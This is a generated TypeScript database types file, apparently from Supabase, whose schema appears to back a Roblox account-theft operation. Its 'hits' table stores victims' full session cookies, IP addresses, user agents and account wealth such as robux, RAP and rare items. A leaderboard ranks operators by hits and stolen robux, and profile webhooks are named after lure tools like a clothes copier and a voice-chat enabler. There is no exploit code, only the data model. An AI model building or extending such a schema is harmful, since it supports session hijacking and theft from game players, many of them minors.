export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.5"
  }
  public: {
    Tables: {
      hits: {
        Row: {
          cookie_full: string | null
          cookie_preview: string | null
          created_at: string
          id: string
          ip_address: string | null
          is_valid: boolean | null
          last_checked_at: string | null
          owner_id: string
          roblox_age_verified: boolean | null
          roblox_gamepass_earnings: number | null
          roblox_has_headless: boolean | null
          roblox_has_korblox: boolean | null
          roblox_headshot_url: string | null
          roblox_premium: boolean | null
          roblox_rap: number | null
          roblox_robux: number | null
          roblox_robux_spent: number | null
          roblox_summary: number | null
          roblox_user_id: number | null
          roblox_username: string | null
          roblox_voice_enabled: boolean | null
          tool_type: string
          user_agent: string | null
        }
        Insert: {
          cookie_full?: string | null
          cookie_preview?: string | null
          created_at?: string
          id?: string
          ip_address?: string | null
          is_valid?: boolean | null
          last_checked_at?: string | null
          owner_id: string
          roblox_age_verified?: boolean | null
          roblox_gamepass_earnings?: number | null
          roblox_has_headless?: boolean | null
          roblox_has_korblox?: boolean | null
          roblox_headshot_url?: string | null
          roblox_premium?: boolean | null
          roblox_rap?: number | null
          roblox_robux?: number | null
          roblox_robux_spent?: number | null
          roblox_summary?: number | null
          roblox_user_id?: number | null
          roblox_username?: string | null
          roblox_voice_enabled?: boolean | null
          tool_type: string
          user_agent?: string | null
        }
        Update: {
          cookie_full?: string | null
          cookie_preview?: string | null
          created_at?: string
          id?: string
          ip_address?: string | null
          is_valid?: boolean | null
          last_checked_at?: string | null
          owner_id?: string
          roblox_age_verified?: boolean | null
          roblox_gamepass_earnings?: number | null
          roblox_has_headless?: boolean | null
          roblox_has_korblox?: boolean | null
          roblox_headshot_url?: string | null
          roblox_premium?: boolean | null
          roblox_rap?: number | null
          roblox_robux?: number | null
          roblox_robux_spent?: number | null
          roblox_summary?: number | null
          roblox_user_id?: number | null
          roblox_username?: string | null
          roblox_voice_enabled?: boolean | null
          tool_type?: string
          user_agent?: string | null
        }
        Relationships: [
          {
            foreignKeyName: "hits_owner_id_fkey"
            columns: ["owner_id"]
            isOneToOne: false
            referencedRelation: "profiles"
            referencedColumns: ["id"]
          },
        ]
      }
      leaderboard: {
        Row: {
          hit_count: number
          id: string
          real_hit_count: number
          referral_count: number
          total_rap: number
          total_robux: number
          updated_at: string
          username: string
        }
        Insert: {
          hit_count?: number
          id: string
          real_hit_count?: number
          referral_count?: number
          total_rap?: number
          total_robux?: number
          updated_at?: string
          username: string
        }
        Update: {
          hit_count?: number
          id?: string
          real_hit_count?: number
          referral_count?: number
          total_rap?: number
          total_robux?: number
          updated_at?: string
          username?: string
        }
        Relationships: [
          {
            foreignKeyName: "leaderboard_id_fkey"
            columns: ["id"]
            isOneToOne: true
            referencedRelation: "profiles"
            referencedColumns: ["id"]
          },
        ]
      }
      profiles: {
        Row: {
          created_at: string
          id: string
          login_key: string | null
          referral_count: number
          referred_by: string | null
          signup_webhook_url: string | null
          updated_at: string
          username: string
          webhook_bot_followers: string | null
          webhook_copy_clothes: string | null
          webhook_copy_games: string | null
          webhook_group_botter: string | null
          webhook_url: string | null
          webhook_vc_enabler: string | null
        }
        Insert: {
          created_at?: string
          id: string
          login_key?: string | null
          referral_count?: number
          referred_by?: string | null
          signup_webhook_url?: string | null
          updated_at?: string
          username: string
          webhook_bot_followers?: string | null
          webhook_copy_clothes?: string | null
          webhook_copy_games?: string | null
          webhook_group_botter?: string | null
          webhook_url?: string | null
          webhook_vc_enabler?: string | null
        }
        Update: {
          created_at?: string
          id?: string
          login_key?: string | null
          referral_count?: number
          referred_by?: string | null
          signup_webhook_url?: string | null
          updated_at?: string
          username?: string
          webhook_bot_followers?: string | null
          webhook_copy_clothes?: string | null
          webhook_copy_games?: string | null
          webhook_group_botter?: string | null
          webhook_url?: string | null
          webhook_vc_enabler?: string | null
        }
        Relationships: []
      }
      reserved_usernames: {
        Row: {
          name: string
        }
        Insert: {
          name: string
        }
        Update: {
          name?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      refresh_leaderboard_profile: {
        Args: { _profile_id: string }
        Returns: undefined
      }
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
